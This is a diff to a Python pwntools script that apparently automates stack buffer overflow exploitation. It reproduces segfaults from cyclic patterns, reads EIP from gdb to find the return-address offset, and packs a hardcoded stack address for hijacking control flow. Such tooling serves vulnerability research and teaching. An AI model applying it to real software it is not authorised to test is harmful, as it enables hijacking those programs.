@@ -1,10 +1,11 @@
 from pwn import *
-from utils import cleanup
+from utils import cleanup, build_command
+import argparse
 
 def generate_testcase():
     return cyclic(10000)
 
-def reproducer(crash_input: bytes, target_bin: str):
+def reproducer(crash_input: bytes, arg_config: argparse.Namespace):
     """
     Validates that the input causes a memory corruption crash by reproducing that crash.
 
@@ -13,22 +14,35 @@ def reproducer(crash_input: bytes, target_bin: str):
     target_bin: The binary file we want to explore and exploit.
 
     Returns:
-    Bool: True if the program crashes with a segmentation fault; False otherwise.
+    bool: True if the program crashes with a segmentation fault.
     """
+    target_bin = arg_config.target
 
-    #must add the configuration asap!!!
+    command = build_command(arg_config, crash_input)
+    print(command)
+
     rep_proc = subprocess.Popen(
-        [target_bin, crash_input],
+        command,
         stdin=subprocess.PIPE,
         stdout=subprocess.PIPE, 
         stderr=subprocess.PIPE, 
         text=True
     )
 
+    #sending the crash input from stdin to all targets
     rep_proc.communicate(input=crash_input.decode())
 
     if rep_proc.returncode == -11:  #segfault
-        return True
+        core_path = f"/core_dumps/core.{target_bin}.{rep_proc.pid}"
+
+        if os.path.isfile(core_path):
+            os.remove(core_path)
+            return True
+
+        else:
+            print("Core dump is missing; Something went wrong.")
+            sys.exit(1)
+
     else:
         logging.error("No memory corruption crash detected")
         sys.exit(1)
@@ -39,7 +53,6 @@ def root_cause_analysis(crash_input: bytes, target_bin: str):
     Triggers a test crash with the given input and extracts information from the resulting core dump.
     Analyzes the provided payload input to confirm whether it can reach and potentially overwrite
     the return address, causing EIP hijacking.
-
 
     Parameters:
     crash_input: The payload input that potentially overwrites the return address of the vulnerable function.
@@ -137,6 +150,7 @@ def locate_ra3(pattern, target):
         output = gdb_proc.stdout.readline()
         # print(output)
         if "Program received signal SIGSEGV" in output:
+            print(output)
             break
 
     gdb_proc.stdin.write("info registers\n")
@@ -151,7 +165,7 @@ def locate_ra3(pattern, target):
 
     output, _ = gdb_proc.communicate()
 
-    # print(output)
+    print(output)
     # print(pattern)
     
     eip_value = None
@@ -160,7 +174,7 @@ def locate_ra3(pattern, target):
             eip_value = line.split()[1]  # Extract the hexadecimal value (second column)
             break
 
-    # print(eip_value)
+    print(eip_value)
 
     offset = cyclic_find(0x66616166)
     address = struct.pack("<I", 0xffffd5b4)
